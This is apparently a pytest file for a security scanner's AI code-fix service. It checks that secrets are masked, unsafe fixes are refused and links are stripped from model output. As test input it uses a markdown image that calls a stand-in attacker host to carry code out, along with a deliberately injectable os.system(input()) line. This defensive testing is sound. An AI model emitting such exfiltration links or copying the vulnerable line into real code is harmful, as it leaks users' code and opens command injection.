"""What a code fix sends the model, and what it never tries."""

import hashlib
from datetime import UTC, datetime
from uuid import uuid4

import pytest

from reconix_api.models.enums import FindingStatus, SeverityStatus, ValidationStatus
from reconix_api.schemas.code import CodeFindingOut
from reconix_api.services import code_fixes
from tests.fakes import fake_mask_secrets


def finding(path: str | None = "src/app.py", line: int | None = 2, tools=("SEMGREP",)):
    return CodeFindingOut(
        finding_id=uuid4(),
        code="RCX-001",
        title="Dangerous call",
        target=f"/workspace/code/s/{path}",
        description="os.system with input.",
        severity_status=SeverityStatus.HIGH,
        cvss_score=None,
        cwe_ids=[],
        owasp_id=[],
        cve_ids=[],
        impact=None,
        remediation=None,
        validation_status=ValidationStatus.UNCONFIRMED,
        finding_status=FindingStatus.OPEN,
        reviewed_by=None,
        reviewed_at=None,
        created_at=datetime.now(UTC),
        assessment_id=uuid4(),
        tools=list(tools),
        path=path,
        line=line,
        end_line=line,
        rule_id="python.dangerous-system-call",
        snippet=None,
        file_sha256=None,
    )


def test_findings_no_agent_should_try():
    assert code_fixes.not_fixable(finding(tools=["GITLEAKS"])) == code_fixes.LEAK_NOTE
    assert code_fixes.not_fixable(finding(tools=["SEMGREP", "GITLEAKS"])) == code_fixes.LEAK_NOTE
    dependency = finding("requirements.txt", 1, ["TRIVY", "GRYPE"])
    assert code_fixes.not_fixable(dependency) == code_fixes.DEPENDENCY_NOTE
    assert code_fixes.not_fixable(finding(line=None)) == code_fixes.NO_PLACE_NOTE
    assert code_fixes.not_fixable(finding("Dockerfile", 3, ["TRIVY"])) is None  # IaC: code
    assert code_fixes.not_fixable(finding()) is None


@pytest.fixture
def folder(tmp_path):
    (tmp_path / "src").mkdir()
    return tmp_path


def write(folder, path: str, data: bytes) -> str:
    (folder / path).write_bytes(data)
    return hashlib.sha256(data).hexdigest()


def test_the_model_sees_the_file_masked_and_secret_lines_hidden(folder):
    data = b"import os\nAPI = 'k'\npassword = 'hunter22'\nos.system(input())\n"
    sha = write(folder, "src/app.py", data)
    copy = code_fixes.file_copy(folder, "src/app.py", sha, {2}, fake_mask_secrets)
    assert copy.real[1] == "API = 'k'" and copy.masked[1] == "[MASKED]"
    assert "hunter22" not in "\n".join(copy.masked) and "hunter22" in copy.real[2]
    assert copy.masked[3] == "os.system(input())" and copy.sha256 == sha


def test_a_file_the_scan_did_not_read_as_it_is_now_is_not_sent(folder):
    sha = write(folder, "src/app.py", b"x = 1\n")
    write(folder, "src/app.py", b"x = 2\n")
    assert code_fixes.file_copy(folder, "src/app.py", sha, set(), fake_mask_secrets) == (
        code_fixes.CHANGED_NOTE
    )
    assert code_fixes.file_copy(folder, "src/gone.py", sha, set(), fake_mask_secrets) == (
        code_fixes.GONE_NOTE
    )


def test_binary_or_non_utf8_files_are_not_sent(folder):
    for data in (b"\x00\x01binary", b"caf\xe9\n"):
        sha = write(folder, "src/blob.py", data)
        note = code_fixes.file_copy(folder, "src/blob.py", sha, set(), fake_mask_secrets)
        assert note == code_fixes.NOT_TEXT_NOTE


def test_a_large_file_is_not_sent(folder, monkeypatch):
    monkeypatch.setattr(code_fixes, "MAX_FILE_BYTES", 10)
    sha = write(folder, "src/big.py", b"x = 1\n" * 5)
    assert code_fixes.file_copy(folder, "src/big.py", sha, set(), fake_mask_secrets) == (
        code_fixes.TOO_LARGE_NOTE
    )


def test_a_secret_over_several_lines_is_hidden_on_every_line():
    from reconix_ai.harness import mask_secrets

    real = [
        "KEY = '''",
        "-----BEGIN RSA PRIVATE KEY-----",
        "MIIEowIBAAKCAQEAfakefakefakefakefakefakefakefake",
        "bm90LWEtcmVhbC1rZXktanVzdC10ZXN0LWRhdGE=",
        "-----END RSA PRIVATE KEY-----",
        "'''",
        "print('ok')",
    ]
    view = code_fixes.masked_lines(real, mask_secrets)
    assert len(view) == len(real)
    assert view[2] == view[3] == code_fixes.HIDDEN_LINE  # the key's body lines
    assert "MIIE" not in "\n".join(view) and "bm90" not in "\n".join(view)
    assert view[-1] == "print('ok')"


def test_only_a_scan_whose_gitleaks_ran_lets_code_go_to_the_model():
    assert code_fixes.gitleaks_read({"tools": ["SEMGREP", "GITLEAKS"], "notes": []})
    assert not code_fixes.gitleaks_read({"tools": ["SEMGREP"], "notes": []})
    assert not code_fixes.gitleaks_read({"tools": ["GITLEAKS"], "notes": ["GITLEAKS FAILED"]})
    blocked = {"tools": ["GITLEAKS"], "notes": ["GITLEAKS BLOCKED TOO_MANY_ACTIONS"]}
    assert not code_fixes.gitleaks_read(blocked)
    assert code_fixes.gitleaks_read({"tools": ["GITLEAKS"], "notes": ["SYFT 3 packages"]})


def test_edits_a_mask_would_change_are_dropped():
    from reconix_ai.agent.code_fix import FileFix, FixOutcome, FixOutput, FixTarget

    def fix_of(path, text):
        return FileFix(path, "0" * 64, [{"start_line": 1, "end_line": 1, "replacement": text}])

    targets = [
        FixTarget("a", "a.py", "t", "HIGH", ["SEMGREP"], 1, 1),
        FixTarget("b", "b.py", "t", "HIGH", ["SEMGREP"], 1, 1),
    ]
    output = FixOutput(
        [fix_of("a.py", "x = 1"), fix_of("b.py", "password = 'hunter22'")],
        "summary",
        [FixOutcome("a", "FIXED", "ok"), FixOutcome("b", "FIXED", "ok")],
        10,
    )
    kept = code_fixes.refuse_unsafe_files(output, targets, fake_mask_secrets)
    assert [fix.path for fix in kept.files] == ["a.py"]
    assert [(r.finding_id, r.status) for r in kept.results] == [("a", "FIXED"), ("b", "NOT_FIXED")]
    assert kept.results[1].note == code_fixes.REFUSED_NOTE


def test_model_text_keeps_no_link_image_or_tag():
    text = "Fixed ![x](https://evil.example/?d=code) see [docs](https://evil.example) <img src=x>"
    assert code_fixes.plain(text) == "Fixed  see docs "
